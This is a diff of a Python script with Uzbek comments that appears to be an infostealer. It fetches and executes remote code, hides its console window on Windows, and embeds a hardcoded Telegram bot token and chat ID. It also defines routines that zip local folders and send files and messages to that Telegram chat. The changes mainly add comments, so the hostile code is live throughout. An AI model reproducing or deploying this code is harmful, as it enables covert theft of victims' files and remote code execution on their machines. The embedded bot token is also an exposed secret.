@@ -1,21 +1,21 @@
-# ===================================================================
-# BU KOD O'ZINI O'ZI ISHGA TUSHIRADI VA 'requests' KERAK EMAS!
-# ===================================================================
 import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json
 
+# O'z-o'zini ishga tushirish (agar internetdan kelsa)
 if len(sys.argv) > 0 and "http" in sys.argv[0]:
     try:
         exec(urllib.request.urlopen(sys.argv[0]).read())
         sys.exit()
-    except Exception:
+    except:
         pass
 
+# Qora oynani yashirish
 if os.name == 'nt':
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
 
+# requests ishlatmaydigan Telegram yuborish funksiyalari
 def send_telegram_file(file_path, caption):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -46,6 +46,7 @@ def send_telegram_message(text):
     except:
         pass
 
+# ZIP siqish
 def zip_folder(folder_path, output_path):
     with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
         for root, dirs, files in os.walk(folder_path):
